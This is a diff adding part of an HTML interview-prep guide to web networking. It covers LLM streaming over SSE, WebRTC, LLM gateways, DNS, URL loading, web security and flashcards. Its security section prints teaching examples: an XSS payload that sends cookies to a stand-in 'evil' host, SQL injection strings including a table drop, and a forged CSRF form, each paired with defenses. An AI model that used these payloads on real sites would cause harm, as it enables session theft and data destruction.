+    Q -->|"fetch + ReadableStream"| F["✅ POST a body (the prompt)<br/>set the Authorization header<br/>read the chunks yourself"]:::good
+    E --> X["✗ won't work for an LLM call"]:::bad
+    F --> Y["✓ what OpenAI/Anthropic clients use"]:::good
+    </div>
+    <p>Same SSE bytes on the wire either way — the only question is <i>which client API</i> reads them, and only <code>fetch</code> streaming can do the POST + auth an LLM call needs.</p>
+    <h4>What an LLM chat request actually looks like, end to end</h4>
+    <p>It's a single round trip: one POST goes up with your message; the reply streams back token by token over the open response.</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant U as Browser / SDK
+    participant S as LLM API server
+    Note over U: this request is made with fetch()<br/>it sets the method + headers + body<br/>EventSource can't: GET only, no headers, no body
+    Note over U,S: ① ONE request, and it is a POST
+    U->>S: POST /v1/chat/completions<br/>Authorization: Bearer sk-...<br/>body = {messages, model, stream:true}
+    Note over U,S: ② server holds the response open
+    S-->>U: 200 OK<br/>Content-Type: text/event-stream
+    Note over U,S: ③ tokens stream back — one SSE event each
+    S-->>U: data: {delta: 'Hel'}
+    S-->>U: data: {delta: 'lo'}
+    S-->>U: data: {delta: '!'}
+    S-->>U: data: [DONE]
+    Note over U: read chunk-by-chunk via<br/>response.body.getReader() (ReadableStream)
+    Note over U,S: ④ client concatenates the deltas → Hello!
+    </div>
+    <p><b>Why the POST + <code>Authorization</code> (the two ❌s above) matter so much:</b></p>
+    <ul>
+      <li><b>POST carries the prompt.</b> An LLM call sends a lot — the full prompt, the whole chat history, system message, tool definitions, parameters — kilobytes to megabytes of JSON. That can only ride in the request <b>body</b>, and GET has no body. (Stuffing it into the URL hits the ~2–8 KB length limit and leaks the content into every server/proxy log.) <code>EventSource</code> is GET-only → it literally can't send the prompt.</li>
+      <li><b>Authorization carries the API key.</b> The API is paid and access-controlled; the key travels in the <code>Authorization: Bearer …</code> header. <code>EventSource</code> can't set headers → no clean way to authenticate (you'd be forced to put the key in the URL — logged, insecure).</li>
+    </ul>
+    <h4>The two layers — the client API vs the HTTP request it sends</h4>
+    <p><code>fetch</code> / <code>EventSource</code> is the <b>JavaScript you write</b>; the <code>POST …</code> in the diagram is the <b>HTTP request that code produces</b>. The method (GET/POST) is a property of the request — whether you can set it freely depends on which API you use:</p>
+    <div class="card" style="font-family:var(--mono);font-size:.78rem;line-height:1.5;white-space:pre-wrap;overflow-x:auto">// fetch — you set method / headers / body
+fetch('/v1/chat/completions', {
+  method: 'POST',
+  headers: { Authorization: 'Bearer sk-...' },
+  body: JSON.stringify({ messages, model, stream: true })
+})   // → produces the POST in the diagram ✅</div>
+    <div class="card" style="font-family:var(--mono);font-size:.78rem;line-height:1.5;white-space:pre-wrap;overflow-x:auto">// EventSource — only a URL, nothing else
+new EventSource('/v1/chat/completions')
+// → always GET · no headers · no body → can't send the prompt or the key ❌</div>
+    <p><b>Takeaway:</b> with <code>fetch</code> <i>you</i> choose method/headers/body, so you can POST the prompt and send the key. <code>EventSource</code> is locked to GET with no headers and no body — so "just switch to GET" isn't a one-word change: GET has no body, so the prompt has nowhere to go.</p>
+    <p><b>SSE's real costs (worth naming in an interview):</b></p>
+    <ul>
+      <li><b>HTTP/1.1 connection limit</b> — a browser allows only ~6 connections per domain, so many open tabs queue; HTTP/2 multiplexing fixes this.</li>
+      <li><b>Text-only</b> — binary must be base64-encoded (+33% size).</li>
+      <li><b>Reconnect gap</b> — between the old stream closing and the new POST opening, events can be dropped unless you track an <code>id</code> and resume.</li>
+    </ul>
+    <p><b>Why not just always use WebSocket?</b> It <b>pins the connection to one server</b>, so horizontal scaling needs a Redis pub/sub layer to fan messages out (more latency), and corporate proxies / firewalls often reject the <code>Upgrade</code> handshake outright. For one-way text streaming that's pure cost with no benefit.</p>
+    <h4>WebRTC — for real-time voice &amp; video</h4>
+    <p>For a real-time <b>voice/video</b> conversation (e.g. OpenAI's Realtime API), the tool is <b>WebRTC</b> — not any HTTP-based option. The governing principle: <b>voice tolerates packet loss, but never latency</b> — a lost 20 ms of audio is imperceptible, but waiting for TCP to retransmit it stalls everything after and breaks the conversation. Hence UDP:</p>
+    <table>
+      <tr><th></th><th>WebSocket</th><th>WebRTC</th></tr>
+      <tr><td>Transport</td><td>TCP</td><td><b>UDP</b></td></tr>
+      <tr><td>Topology</td><td>client ↔ server</td><td><b>peer-to-peer</b> (falls back to a TURN relay)</td></tr>
+      <tr><td>Typical latency</td><td>50–500 ms</td><td>50–150 ms</td></tr>
+      <tr><td>On packet loss</td><td>forced retransmit → stall</td><td><b>loss concealment</b> — interpolate the gap and keep going</td></tr>
+      <tr><td>Built-in audio</td><td>none</td><td>echo cancellation (AEC), noise suppression (NS), auto-gain (AGC), adaptive bitrate</td></tr>
+      <tr><td>Complexity</td><td>low</td><td>high</td></tr>
+    </table>
+    <p><b>The pieces:</b> WebRTC still needs a <b>signaling</b> channel (often a WebSocket!) to swap connection descriptions (<b>SDP</b>); then <b>ICE / STUN / TURN</b> handle NAT traversal — <b>STUN</b> discovers your public IP:port for a direct peer link, and <b>TURN</b> relays the media through a server when a direct link is impossible. The media itself is encrypted with <b>DTLS / SRTP</b>.</p>
+  </section>
+
+  <!-- ============ LLM GATEWAY ============ -->
+  <section id="llmgw">
+    <h2><span class="num">11</span>LLM Gateway</h2>
+    <p>An <b>LLM gateway</b> is a middleware layer (a reverse proxy) that sits between your apps and the model providers — every call goes <i>App → Gateway → provider</i> (OpenAI / Anthropic / Azure / a self-hosted model). Same idea as an API gateway, but with features specific to LLM traffic.</p>
+    <div class="mermaid">
+flowchart LR
+    classDef app fill:#e3edf8,stroke:#3367b5,color:#1f3a66
+    classDef gw fill:#ece9fb,stroke:#5b54c7,color:#36308a
+    classDef prov fill:#dcefe2,stroke:#1f7a70,color:#1d6b32
+    A1["Chat app"]:::app --> GW
+    A2["Batch job"]:::app --> GW
+    A3["Internal tool"]:::app --> GW
+    GW["LLM Gateway<br/>one OpenAI-compatible API<br/>keys · quotas · cache · routing · logs"]:::gw
+    GW --> P1["OpenAI"]:::prov
+    GW --> P2["Anthropic"]:::prov
+    GW --> P3["Azure / self-hosted"]:::prov
+    </div>
+    <h4>Why put a box in the middle?</h4>
+    <p>Without one, every service re-implements the same plumbing and the pain compounds:</p>
+    <table>
+      <tr><th>Problem without a gateway</th><th>What the gateway does</th></tr>
+      <tr><td>API keys copied into many services → leak risk</td><td><b>Central key management</b> — the real provider key lives only in the gateway; each service gets a <b>virtual key</b> the gateway can revoke.</td></tr>
+      <tr><td>Switching model/provider means code changes everywhere</td><td><b>Unified API</b> — apps call one OpenAI-compatible endpoint; swap the model behind it by config.</td></tr>
+      <tr><td>One team's runaway usage drains the shared budget</td><td><b>Per-team token quotas &amp; rate limits</b> — over budget returns <code>429</code>, so other teams aren't hit.</td></tr>
+      <tr><td>No idea who spends what</td><td><b>Observability</b> — logs tokens, latency, and error rate per team/route for cost attribution.</td></tr>
+      <tr><td>A provider outage takes you down</td><td><b>Fallback &amp; load balancing</b> — after repeated failures it auto-switches to a backup route/provider.</td></tr>
+      <tr><td>Paying full price for repeated questions</td><td><b>Semantic cache</b> (below).</td></tr>
+    </table>
+    <h4>The LLM-specific trick — semantic caching</h4>
+    <p>A normal cache keys on an <i>exact</i> string match. A <b>semantic cache</b> embeds the question into a vector and matches by <b>similarity</b>, so "how do I reset my password?" and "I forgot my password, what now?" hit the <i>same</i> cached answer — skipping the model call entirely (cheaper + instant).</p>
+    <ul>
+      <li><b>Similarity threshold</b> is the knob: too high (0.99) and almost nothing matches; too low (0.7) and you return wrong answers. ~0.85–0.95 is typical.</li>
+      <li><b>TTL by volatility</b> — volatile facts (weather, stock prices) expire in minutes; stable FAQs can live for days.</li>
+    </ul>
+    <div class="note"><b>Not just a load balancer:</b> a generic API gateway can't do token budgeting, semantic caching, or per-model cost attribution — those LLM-specific needs are why this exists. Popular implementations: <b>LiteLLM</b> (Python, 100+ models), <b>One API</b> (Go), <b>Portkey</b>, <b>Bifrost</b> (Rust).</div>
+  </section>
+
+  <!-- ============ DNS ============ -->
+  <section id="dns">
+    <h2><span class="num">12</span>DNS — names to addresses</h2>
+    <p>DNS resolves a hostname like <code>example.com</code> into an IP. It's a hierarchy queried mostly over <b>UDP port 53</b>, with heavy caching at every level.</p>
+    <div class="mermaid">
+flowchart LR
+    A["browser / OS cache"]:::c -->|miss| R["resolver<br/>(your ISP)"]:::r
+    R -->|"1. .?"| ROOT["root server"]:::s
+    ROOT -->|"try .com TLD"| R
+    R -->|"2. example.com?"| TLD[".com TLD server"]:::s
+    TLD -->|"ask the authoritative NS"| R
+    R -->|"3. example.com?"| AUTH["authoritative server"]:::s
+    AUTH -->|"= 93.184.x.x"| R
+    R -->|cache + return| A
+    classDef c fill:#e3edf8,stroke:#3367b5,color:#1f3a66;
+    classDef r fill:#fbf3da,stroke:#c9a83a,color:#6b5212;
+    classDef s fill:#eef1f5,stroke:#bcc6d2,color:#2a3340;
+    </div>
+    <div class="note"><b>Recursive vs iterative, and the cache order.</b> The <b>recursive resolver</b> does the legwork: the browser asks it <i>once</i> and demands the final answer (a <b>recursive</b> query); the resolver then walks the hierarchy itself, each server handing back a referral to the next (<b>iterative</b> queries: root → TLD → authoritative). Before any network query, the name is checked against caches in order: <b>browser cache → OS cache + the hosts file → router cache → ISP resolver cache</b> — only a full miss triggers the hierarchy walk.</div>
+    <div class="note"><b>UDP or TCP — and why 512 bytes?</b> Normal lookups use <b>UDP</b> (fast, one packet). The old DNS spec capped a UDP response at <b>512 bytes</b>, because a bigger UDP packet gets <b>fragmented</b> at the IP layer, and fragmented UDP is fragile (lose one fragment and the whole reply fails; many firewalls drop fragments). So when a reply exceeds 512 bytes — a <b>zone transfer</b> (copying a whole zone between servers), a name with many records, or big <b>DNSSEC</b> signatures — DNS falls back to <b>TCP</b> (a reliable stream that carries any size). <b>EDNS0</b> now lets UDP advertise a larger buffer to avoid TCP for moderately large replies; DoT/DoH tunnel DNS over TLS/HTTPS for privacy.</div>
+  </section>
+
+  <!-- ============ URL ============ -->
+  <section id="url">
+    <h2><span class="num">13</span>What happens when you type a URL</h2>
+    <p>The classic end-to-end question — it stitches the whole guide together:</p>
+    <div class="mermaid">
+flowchart TB
+    U["1. parse URL"]:::s --> D["2. DNS: name → IP<br/>(cache → resolver → hierarchy)"]:::s
+    D --> A["3. ARP: find the gateway's MAC"]:::s
+    A --> T["4. TCP 3-way handshake"]:::s
+    T --> L["5. TLS handshake (if HTTPS)"]:::s
+    L --> H["6. send HTTP request"]:::s
+    H --> SV["7. server processes, returns response"]:::s
+    SV --> RR["8. browser renders (HTML → CSS → JS)"]:::ok
+    classDef s fill:#e3edf8,stroke:#3367b5,color:#1f3a66;
+    classDef ok fill:#e4f5e9,stroke:#3aa856,color:#1d6b32;
+    </div>
+    <h4>Step 3 in detail — ARP, Address Resolution Protocol (finding the next-hop MAC)</h4>
+    <p>To put a packet on the wire, the link layer needs the <b>MAC address</b> of the next hop. Your target server is on a remote network, so the next hop is your <b>gateway (router)</b> — you know its IP (from your network config) but not its MAC. ARP resolves IP → MAC on the local network:</p>
+    <ol>
+      <li>Check the local <b>ARP cache</b> first — if the gateway's MAC is there, done.</li>
+      <li>Otherwise <b>broadcast</b> an ARP request to <code>ff:ff:ff:ff:ff:ff</code> (every device on the LAN sees it): "Who has 192.168.1.1? Tell 192.168.1.50".</li>
+      <li>The gateway (which owns that IP) <b>unicasts</b> back an ARP reply: "192.168.1.1 is at aa:bb:cc:dd:ee:ff".</li>
+      <li>You cache it, set the Ethernet frame's destination MAC to the gateway's, and send — the router then forwards your packet onward.</li>
+    </ol>
+    <p>Key point: ARP only works on the <i>local</i> segment (it's a broadcast). For a remote server you ARP the <b>gateway's</b> MAC, not the server's — the destination <i>IP</i> stays the server, but each hop's Ethernet frame uses the next hop's MAC.</p>
+    <div class="iq">Hit the layers in order and you'll never blank on this: <b>DNS</b> (app) → <b>TCP</b> handshake (transport) → <b>TLS</b> → <b>HTTP</b> request/response → render. Bonus points for mentioning caches at each DNS level, ARP for the local MAC, and keep-alive reusing the TCP connection for subsequent assets.</div>
+  </section>
+
+  <!-- ============ SECURITY ============ -->
+  <section id="security">
+    <h2><span class="num">14</span>Web security — the big four</h2>
+    <table>
+      <tr><th>Attack</th><th>What it is</th><th>Defense</th></tr>
+      <tr><td><b>XSS</b> (cross-site scripting)</td><td>Attacker injects JS that runs in <i>other users'</i> browsers (stored / reflected / DOM)</td><td>Escape/encode output, Content-Security-Policy, <code>HttpOnly</code> cookies, validate input</td></tr>
+      <tr><td><b>CSRF</b> (cross-site request forgery)</td><td>Tricks a logged-in user's browser into making an unwanted request (rides their cookie)</td><td>Strongest first: <code>SameSite</code> cookies → CSRF token → Origin/Referer check (fallback)</td></tr>
+      <tr><td><b>SQL injection</b></td><td>User input breaks out into the SQL query</td><td><b>Parameterized queries</b> / prepared statements, least-privilege DB user</td></tr>
+      <tr><td><b>DDoS</b></td><td>Botnet floods you with traffic to exhaust capacity</td><td>Rate limiting, WAF/scrubbing, CDN, autoscale, blackhole</td></tr>
+      <tr><td><b>DNS hijacking</b> (spoofing / poisoning)</td><td>Attacker forges a DNS reply (or poisons a resolver's cache) so a name resolves to <i>their</i> IP — the victim lands on a fake site</td><td>DNSSEC (signed records), DoT/DoH (encrypted DNS), trusted resolvers; HTTPS + cert check still catches the fake site</td></tr>
+    </table>
+    <div class="note"><b>The three XSS types:</b> <b>Stored</b> — the payload is saved on the server and served to other users (e.g. a malicious comment). <b>Reflected</b> — the payload is echoed straight back from the request (e.g. a search term in the URL). <b>DOM-based</b> — client-side JS writes attacker input into the page; the server never sees it, so server-side output-encoding won't catch it — you must sanitize in the JS too.</div>
+    <h4>XSS — how it works, then how the defenses stop it</h4>
+    <p><b>The attack:</b> a page renders user input without escaping — e.g. a saved comment <code>&lt;script&gt;fetch('//evil/?c='+document.cookie)&lt;/script&gt;</code> runs in every viewer's browser, stealing their cookie/session or acting as them. Defenses:</p>
+    <ul>
+      <li><b>Output encoding / escaping</b> — when you insert user data into a page, convert <code>&lt; &gt; &amp; " '</code> into HTML entities so the browser renders them as <i>text</i>, never as tags or script. The single most important defense — and it must match the context (HTML body vs attribute vs inline-JS vs URL each escape differently).</li>
+      <li><b>Content-Security-Policy (CSP)</b> — a response header that whitelists where scripts may load from (e.g. <code>script-src 'self'</code>). Even if an attacker injects a <code>&lt;script&gt;</code>, the browser refuses to run inline or off-domain code — a safety net for when encoding is missed.</li>
+      <li><b>HttpOnly cookies</b> — mark the session cookie unreadable from JavaScript, so an injected script can't steal it via <code>document.cookie</code>.</li>
+      <li><b>Input validation / sanitization</b> — reject or strip dangerous markup on the way in (for rich text, run an allow-list HTML sanitizer). For DOM-based XSS you must also sanitize in the client JS, since the server never sees the data.</li>
+    </ul>
+    <h4>CSRF — how it works, then how the defenses stop it</h4>
+    <p><b>The attack:</b> you're logged into your bank; a malicious page auto-submits a hidden <code>&lt;form action="bank.com/transfer" method="POST"&gt;</code> — the browser attaches your bank cookie, so the transfer succeeds. The attacker never reads the response; they only need the side-effect to fire. Defenses:</p>
+    <ul>
+      <li><b>SameSite cookies</b> — <code>SameSite=Lax</code> (now the browser default) or <code>Strict</code> tells the browser <i>not</i> to attach the cookie to cross-site requests. No cookie ride → the forged request is unauthenticated. The strongest and simplest defense.</li>
+      <li><b>CSRF token</b> — the server plants a random, per-session secret token in each form/page; a genuine request echoes it back, but the attacker's cross-site page can't read it (the same-origin policy blocks that). Missing or wrong token → rejected. Also called the <i>synchronizer-token</i> pattern.</li>
+      <li><b>Origin / Referer check</b> — the server checks the request's <code>Origin</code>/<code>Referer</code> header matches its own domain. A fallback, since these headers can be absent.</li>
+    </ul>
+    <h4>SQL injection — how it works, then how to stop it</h4>
+    <p><b>The attack:</b> code builds a query by string-concatenation: <code>"SELECT * FROM users WHERE name='" + input + "'"</code>. Input <code>' OR '1'='1</code> makes the WHERE always true (login bypass); <code>'; DROP TABLE users;--</code> smuggles in a second statement. Defenses:</p>
+    <ul>
+      <li><b>Parameterized queries / prepared statements</b> — send the SQL and the data <i>separately</i>; the driver binds the value as pure data, never as executable SQL, so quotes in the input can't break out. The one defense that truly fixes it.</li>
+      <li><b>Least-privilege DB user</b> — the app's account can't <code>DROP</code> or alter schema, shrinking the blast radius if something slips through.</li>
+      <li><b>Input validation + ORM</b> — type/allow-list checks and ORMs (which parameterize by default) add depth — but are not a substitute for prepared statements.</li>
+    </ul>
+    <h4>DDoS — how it works, then how to stop it</h4>
+    <p><b>The attack:</b> a botnet (thousands of compromised machines) floods you to exhaust a resource — bandwidth (<i>volumetric</i>: UDP/ICMP flood), connection state (<i>SYN flood</i> — half-open handshakes), or CPU (expensive requests). Goal: legit users can't get through. Defenses:</p>
+    <ul>
+      <li><b>Rate limiting</b> — cap requests per IP / token / route so one source can't monopolize capacity.</li>
+      <li><b>CDN + Anycast</b> — absorb and spread the flood across many edge nodes near the attackers, far from your origin.</li>
+      <li><b>WAF / scrubbing</b> — a filter that drops malicious traffic patterns; providers (Cloudflare etc.) "scrub" the flood and forward only clean traffic.</li>
+      <li><b>Autoscale + blackhole</b> — scale out under load; as a last resort, route the targeted IP to a null route ("blackhole") to protect everything else.</li>
+      <li><b>SYN cookies</b> — for SYN floods specifically, the server encodes connection state into the SYN-ACK instead of allocating memory, so the half-open queue can't be filled.</li>
+    </ul>
+    <h4>DNS hijacking — how it works, then how to stop it</h4>
+    <p><b>The attack:</b> the attacker forges a DNS reply or poisons a resolver's cache so a name (<code>bank.com</code>) resolves to <i>their</i> IP; the victim types the right name but lands on a look-alike phishing site. Defenses:</p>
+    <ul>
+      <li><b>DNSSEC</b> — records are cryptographically signed, so a resolver can verify the answer is authentic and untampered, rejecting forged replies.</li>
+      <li><b>DoT / DoH</b> — DNS over TLS / over HTTPS encrypts the query, so an on-path attacker can't read or alter it.</li>
+      <li><b>Trusted resolvers</b> — use a reputable resolver and protect your own router/DNS settings (a common hijack point).</li>
+      <li><b>HTTPS + cert check is the backstop</b> — even if DNS is fooled, the fake site can't present a valid certificate for the real domain, so the browser warns you.</li>
+    </ul>
+    <div class="iq"><b>XSS vs CSRF in one line:</b> XSS = the site wrongly <b>trusts data</b> (runs injected script); CSRF = the site wrongly <b>trusts the browser/cookie</b> (acts on a forged request). XSS defense = encode output + CSP; CSRF defense = tokens + SameSite. Note an XSS hole can defeat most CSRF defenses, so fix XSS first.</div>
+  </section>
+
+  <!-- ============ CHEAT SHEET ============ -->
+  <section id="cheatsheet">
+    <h2><span class="num">15</span>Rapid-fire cheat sheet</h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>Layers</h4>
+        <p>App (HTTP/DNS/TLS) · Transport (TCP/UDP, ports) · Internet (IP) · Link (Ethernet/ARP, MAC).</p>
+        <h4>TCP</h4>
+        <p>3-way handshake (sync seq both ways), 4-way wave (full-duplex), TIME_WAIT = 2 MSL. Reliable via seq/ack/retransmit; flow control = rwnd; congestion = cwnd (slow start → avoidance → fast recovery).</p>
+        <h4>TCP vs UDP</h4>
+        <p>TCP = reliable ordered stream (web/db). UDP = fast connectionless datagram (DNS/video/games).</p>
+      </div>
+      <div class="card">
+        <h4>HTTP</h4>
+        <p>Stateless req/resp. 2xx ok · 3xx redirect · 4xx client · 5xx server. 1.1 keep-alive → 2 multiplexing/HPACK → 3 QUIC (no TCP HOL).</p>
+        <h4>HTTPS</h4>
+        <p>HTTP+TLS: asymmetric to exchange a key, symmetric for data; cert signed by a trusted CA stops MITM.</p>
+        <h4>State &amp; real-time</h4>
+        <p>Session = stateful (shared store). JWT = stateless (signed, hard to revoke). SSE = server→client push. WebSocket = full-duplex.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ QUIZ ============ -->
+  <section id="quiz">
+    <h2><span class="num">16</span>Self-test flashcards <span class="xp" id="score">🃏 0 / 0 flipped</span></h2>
+    <p>Cover the answer, say it out loud, then <b>tap to flip</b>. The progress bar fills as you go.</p>
+    <div class="deck" id="deck">
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">Why three handshakes to connect but four to close?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">Connect: the server's SYN+ACK combine into one packet. Close: the server's ACK of your FIN is sent immediately, but it may still have data to flush before its own FIN — so the ACK and FIN can't combine → 4.</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">What is TIME_WAIT for, and how long?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">~<b>2 MSL</b> on the active closer. (1) re-ACK the peer's retransmitted FIN if the last ACK was lost; (2) let old stray packets die so they can't leak into a new connection on the same port-pair.</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">TCP vs UDP — one-line each?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">TCP = reliable, ordered, connection-oriented byte stream (web, DB). UDP = fast, connectionless datagram, no guarantees (DNS, video, games).</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">What did HTTP/2 and HTTP/3 each fix?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">2: binary framing + <b>multiplexing</b> + HPACK → kills app-layer HOL blocking. 3: runs on <b>QUIC/UDP</b> → kills TCP-layer HOL blocking + fewer handshake RTTs + survives IP changes.</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">Why does TLS use both asymmetric and symmetric crypto?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">Asymmetric (slow) lets strangers agree on a shared secret over an open line; symmetric (fast) encrypts the bulk data. TLS uses asymmetric only for the key exchange, then symmetric for everything after.</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">Session vs JWT — the core trade-off?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">Session = <b>stateful</b>: easy to revoke, but needs shared storage across servers. JWT = <b>stateless</b>: scales trivially (any server verifies the signature) but hard to revoke before expiry (need short TTL + refresh or a blocklist).</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">SSE vs WebSocket?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">SSE = one-way server→client over plain HTTP, auto-reconnect — great for feeds/notifications/LLM streams. WebSocket = full-duplex two-way after an HTTP upgrade — for chat, games, collaboration.</div>
+      </div></button>
+      <button class="flip"><div class="flip-inner">
+        <div class="flip-face flip-front"><div class="q">XSS vs CSRF?</div><div class="hint">tap →</div></div>
+        <div class="flip-face flip-back">XSS = site wrongly trusts <b>data</b> → runs injected script (fix: encode output + CSP + HttpOnly). CSRF = site wrongly trusts the <b>browser/cookie</b> → acts on a forged request (fix: CSRF token + SameSite).</div>
+      </div></button>
+    </div>
+    <div class="deckbar">
+      <button class="btn" id="flipall">🔄 Flip all</button>
+      <button class="btn" id="resetdeck">↺ Reset</button>
+      <span>Tip: cover the back and quiz a friend.</span>
+    </div>
+  </section>
+
+  <!-- ============ BOSS ============ -->
+  <section id="boss">
+    <h2><span class="num">17</span>Boss-level questions <span class="boss">EXPERT</span></h2>
+    <p>These separate "I've used it" from "I understand it." Think first, then reveal.</p>
+
+    <details class="qa"><summary>The third handshake ACK is lost — what happens? <span class="boss lvl2">MEDIUM</span></summary>
+      <div class="ans">The client thinks it's ESTABLISHED (it sent the ACK); the server is still in SYN_RCVD and <b>retransmits its SYN-ACK</b> (up to <code>tcp_synack_retries</code>). When the client replies (its ACK, or data which also acks), the server reaches ESTABLISHED. If the client sends data, that data carries the ACK and fixes it immediately.</div></details>
+
+    <details class="qa"><summary>A server has tens of thousands of sockets stuck in TIME_WAIT. Cause and fix? <span class="boss lvl3">HARD</span></summary>
+      <div class="ans">TIME_WAIT is on whoever <b>actively closes</b>. A server doing lots of <b>short connections</b> (e.g. closing HTTP keep-alive aggressively, or being the side that closes) piles them up, exhausting ephemeral ports. Fixes: enable <b>keep-alive / connection pooling</b> so connections are reused, let the <b>client</b> close instead, tune <code>tcp_tw_reuse</code> for outbound — but don't just kill TIME_WAIT, it exists for correctness.</div></details>
+
+    <details class="qa"><summary>HTTP/2 multiplexes streams — so why does a lost packet still hurt, and how does HTTP/3 help? <span class="boss lvl3">HARD</span></summary>
+      <div class="ans">HTTP/2 removes <b>application-layer</b> HOL blocking, but all its streams still ride <b>one TCP connection</b>. TCP guarantees in-order bytes, so a single lost packet makes the kernel hold back <i>every</i> stream's data until it's retransmitted — <b>TCP-layer HOL blocking</b>. HTTP/3 runs on <b>QUIC</b> (over UDP), which tracks loss <b>per-stream</b>, so a loss in one stream doesn't stall the others.</div></details>
+
+    <details class="qa"><summary>You can ping the server but HTTP times out. What's going on? <span class="boss lvl1">WARM-UP</span></summary>
+      <div class="ans">Ping uses <b>ICMP</b>; HTTP uses <b>TCP port 80/443</b> — different protocols. So the host is up and routable, but: the web process is down, a firewall blocks the TCP port (while allowing ICMP), the port's wrong, or the TCP handshake/app is hanging. Reachability ≠ service availability.</div></details>
+
+    <details class="qa"><summary>Where should you store a JWT in the browser, and why? <span class="boss lvl2">MEDIUM</span></summary>
+      <div class="ans">There's no perfect spot. <b>localStorage</b> is easy but any XSS can steal the token. An <b>HttpOnly cookie</b> hides it from JS (better vs XSS) but is auto-sent, so you must add <b>CSRF</b> protection (SameSite + token). A common answer: short-lived access token in <b>memory</b> + a refresh token in an HttpOnly, SameSite cookie. The real fix is preventing XSS in the first place.</div></details>
+  </section>
+</main>
+
+</div>
+
+<script>
+  mermaid.initialize({
+    startOnLoad:true,
+    theme:'default',
+    themeVariables:{
+      fontFamily:'-apple-system,Segoe UI,Roboto,sans-serif',
+      fontSize:'14px',
+      lineColor:'#9a8f7c',
+      primaryColor:'#fffdf8',
+      primaryTextColor:'#2c2823',
+      primaryBorderColor:'#d8cfbd'
+    },
+    flowchart:{curve:'basis'},
+    securityLevel:'loose'
+  });
+
+  // scrollspy for the TOC
+  const links=[...document.querySelectorAll('nav.toc a')];
+  const map=new Map(links.map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver(es=>{
+    es.forEach(e=>{
+      if(e.isIntersecting){
+        links.forEach(l=>l.classList.remove('active'));
+        const a=map.get(e.target.id); if(a)a.classList.add('active');
+      }
+    });
+  },{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  document.querySelectorAll('section[id]').forEach(s=>obs.observe(s));
+
+  // reading progress bar
+  const bar=document.getElementById('progbar');
+  const main=document.querySelector('main');
+  function updateBar(){
+    const h=main.scrollHeight-window.innerHeight;
+    const p=Math.min(100,Math.max(0,(window.scrollY/h)*100));
+    bar.style.width=p+'%';
+  }
+  window.addEventListener('scroll',updateBar,{passive:true});
+  window.addEventListener('resize',updateBar);updateBar();
+
+  // flashcards
+  const cards=[...document.querySelectorAll('.flip')];
+  const flippedSet=new Set();
+  const score=document.getElementById('score');
+  function refresh(){score.textContent='🃏 '+flippedSet.size+' / '+cards.length+' flipped';}
+  cards.forEach((c,i)=>c.addEventListener('click',()=>{
+    c.classList.toggle('flipped');
+    c.classList.contains('flipped')?flippedSet.add(i):flippedSet.delete(i);
+    refresh();
+  }));
+  document.getElementById('flipall').addEventListener('click',()=>{
+    const allOn=flippedSet.size<cards.length;
+    cards.forEach((c,i)=>{c.classList.toggle('flipped',allOn);allOn?flippedSet.add(i):flippedSet.delete(i);});
+    refresh();
+  });
+  document.getElementById('resetdeck').addEventListener('click',()=>{
+    cards.forEach(c=>c.classList.remove('flipped'));flippedSet.clear();refresh();
+  });
+</script>
+</body>
+</html>
